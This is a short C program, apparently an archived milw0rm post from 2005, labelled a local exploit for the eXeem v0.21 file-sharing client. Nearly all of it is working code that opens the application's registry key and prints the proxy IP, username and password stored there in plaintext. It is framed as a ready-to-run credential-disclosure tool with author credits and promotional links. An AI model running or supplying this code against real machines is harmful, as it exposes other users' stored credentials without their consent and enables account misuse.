/*****************************************************************

eXeem v0.21 Local Exploit by Kozan

Application: eXeem v0.21
Vendor: www.exeem.com
Vulnerable Description: eXeem v0.21 discloses passwords
for proxy settings to local users.

Discovered & Coded by: Kozan
Credits to ATmaCA
Web : www.netmagister.com
Web2: www.spyinstructors.com
Mail: kozan[at]netmagister[dot]com

*****************************************************************/

#include <stdio.h>
#include <windows.h>

#define BUFSIZE 100
HKEY hKey;
char proxy_ip[BUFSIZE],
        proxy_username[BUFSIZE],
        proxy_password[BUFSIZE];

DWORD dwBufLen=BUFSIZE;
LONG lRet;

int main()
{

       if(RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Exeem",
                                       0,
                                       KEY_QUERY_VALUE,
                                       &hKey) == ERROR_SUCCESS)
   {

               lRet = RegQueryValueEx( hKey, "proxy_ip", NULL, NULL,
                                                      (LPBYTE) proxy_ip, &dwBufLen);

                       if( (lRet != ERROR_SUCCESS) || (dwBufLen > BUFSIZE) ){
                                RegCloseKey(hKey);
                                printf("An error occured!\n");
                                return 0;
                       }

               lRet = RegQueryValueEx( hKey, "proxy_username", NULL, NULL,
                                                      (LPBYTE) proxy_username, &dwBufLen);

                       if( (lRet != ERROR_SUCCESS) || (dwBufLen > BUFSIZE) ){
                                RegCloseKey(hKey);
                                printf("An error occured!\n");
                                return 0;
                       }

               lRet = RegQueryValueEx( hKey, "proxy_password", NULL, NULL,
                                                      (LPBYTE) proxy_password, &dwBufLen);

                       if( (lRet != ERROR_SUCCESS) || (dwBufLen > BUFSIZE) ){
                                RegCloseKey(hKey);
                                printf("An error occured!\n");
                                return 0;
                       }

               RegCloseKey(hKey);

               printf("eXeem v0.21 Local Exploit by Kozan\n");
               printf("Credits to ATmaCA\n");
               printf("www.netmagister.com  -  www.spyinstructors.com \n\n");
               printf("Proxy IP           : %s\n",proxy_ip);
               printf("Proxy Username     : %s\n",proxy_username);
               printf("Proxy Password     : %s\n",proxy_password);

   }
       else
       {
       printf("eXeem v0.21 is not installed on your pc!\n");
   }

       return 0;
}

// milw0rm.com [2005-02-22]
